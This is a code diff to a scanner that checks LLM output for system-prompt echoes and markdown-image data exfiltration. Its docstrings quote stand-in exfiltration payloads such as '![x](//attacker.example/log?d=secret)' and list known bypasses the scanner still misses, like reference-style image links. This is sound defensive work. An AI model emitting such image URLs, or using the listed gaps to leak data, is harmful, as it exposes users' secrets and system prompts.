@@ -34,6 +34,10 @@ _MD_LINK = re.compile(r"(?<!!)\[[^\]]*\]\(\s*(?P<url>[^)\s]+)")
 _RAW_HTML = re.compile(r"<\s*(script|iframe|object|embed)\b", re.IGNORECASE)
 
 _MIN_SYSTEM_PROMPT_WORDS = 8
+# Overlapping shingle count at which echo detection saturates at 1.0. Three
+# means two overlapping n-word shingles — a run of n+1 consecutive words
+# reproduced verbatim — crosses G3's 0.60 threshold (2/3 = 0.667).
+_ECHO_SATURATION = 3
 
 
 def scan_secrets(spans: list[Span]) -> list[Finding]:
@@ -93,14 +97,23 @@ def scan_system_echo(output: str, system_prompt: str, n: int = 8) -> list[Findin
       between fragments of the original text breaks every contiguous
       `n`-word run and drives the overlap to zero even though the leak is
       real. Shingling proves a *verbatim* echo; it cannot see a reworded one.
-    - The score is `overlap / len(system_shingles)`: a short, sensitive
-      fragment (say, a stray credential) echoed verbatim out of a very long
-      system prompt scores near zero, diluted by the prompt's total length,
-      and can sit under any reasonable policy threshold while still being a
-      genuine leak. A Finding is still emitted — this is a threshold problem
-      for policy.yaml to price, not a silent miss — but it is recorded here
-      because a near-zero score reads as "basically nothing" to a threshold
-      that was not tuned with dilution in mind.
+
+    Scoring is absolute and saturating (`overlap / _ECHO_SATURATION`, capped
+    at 1.0), not a ratio of the prompt's length. An earlier draft scored
+    `overlap / len(system_shingles)`: reproducing a verbatim 13-word sentence
+    out of the prompt scored 0.2857 against G3's 0.60 threshold, and scored
+    *identically* at both 37-word and 253-word prompt lengths — the ratio
+    wasn't merely diluting a real signal, it structurally could not cross
+    the threshold for a realistic partial leak, at any prompt length, unless
+    the model reproduced most of the prompt. Reproducing any `n+1`-word run
+    verbatim (two overlapping shingles) is already strong evidence on its
+    own and now crosses 0.60 regardless of how long the system prompt is.
+    See the task report for measured false-positive numbers on ordinary,
+    unrelated assistant replies against a realistic system prompt — the
+    `n`-word (default 8) contiguous-match requirement, not the score
+    formula, is what keeps accidental phrase overlap from triggering a
+    Finding at all: absolute scoring only changes how strongly a *given*
+    overlap is scored, not how easily one occurs in the first place.
     """
     if len(re.findall(r"\w+", system_prompt)) < _MIN_SYSTEM_PROMPT_WORDS:
         return []
@@ -113,7 +126,7 @@ def scan_system_echo(output: str, system_prompt: str, n: int = 8) -> list[Findin
     if not overlap:
         return []
 
-    score = len(overlap) / len(system_shingles)
+    score = len(overlap) / _ECHO_SATURATION
     return [
         Finding(
             risk="LLM07",
@@ -125,6 +138,22 @@ def scan_system_echo(output: str, system_prompt: str, n: int = 8) -> list[Findin
             entity="SYSTEM_PROMPT",
         )
     ]
+
+
+def _is_external(url: str) -> bool:
+    """Does this URL leave the page's own origin?
+
+    Protocol-relative URLs are the trap: a browser resolves `//host/log`
+    against the page's current scheme and fetches it exactly like an
+    absolute `https://host/log` URL — no scheme prefix required. An earlier
+    draft guarded only `("http://", "https://")`, so
+    `![x](//attacker.example/log?d=secret)` produced no finding at all: the
+    exact G4 vector, working end to end, reported clean. `.strip()` first
+    so incidental leading whitespace inside the markdown parens (the
+    capturing regex tolerates it) doesn't defeat the prefix check.
+    """
+    lowered = url.strip().lower()
+    return lowered.startswith(("http://", "https://", "//"))
 
 
 def _host_allowed(url: str, allowlist: list[str]) -> bool:
@@ -162,14 +191,17 @@ def scan_exfil(output: str, allowlist: list[str]) -> list[Finding]:
     instant the markdown renders, with no click). That asymmetry is
     intentional, not a gap.
 
+    Image URLs are checked via `_is_external`, which also catches
+    protocol-relative URLs (`![x](//attacker.example/log)`) — an earlier
+    draft matched only an explicit `http://`/`https://` prefix, so this
+    exact G4-closing vector produced no finding while working end to end in
+    a real browser (a client resolves `//host` against the current page's
+    scheme, no scheme prefix required). Fixed; see `_is_external`.
+
     Known, unfixed coverage gaps — a silent `[]` on any of these is not
     proof the output is clean, only that it does not match what this
     scanner was written to recognise:
 
-    - Protocol-relative image URLs (`![x](//attacker.example/log)`) are not
-      host-checked at all: the scheme guard below only inspects URLs that
-      literally start with "http://"/"https://", and a client resolves a
-      "//host/path" URL against the current page's scheme just as eagerly.
     - Reference-style markdown (`![x][ref]` with the URL supplied later in a
       separate `[ref]: https://...` definition line) is invisible to
       `_MD_IMAGE`, which only matches the inline `(url)` form.
@@ -200,7 +232,7 @@ def scan_exfil(output: str, allowlist: list[str]) -> list[Finding]:
 
     for match in _MD_IMAGE.finditer(output):
         url = match.group("url")
-        if url.lower().startswith(("http://", "https://")) and not _host_allowed(url, allowlist):
+        if _is_external(url) and not _host_allowed(url, allowlist):
             add("EXTERNAL_IMAGE", match.start(), match.end())
 
     for match in _MD_LINK.finditer(output):
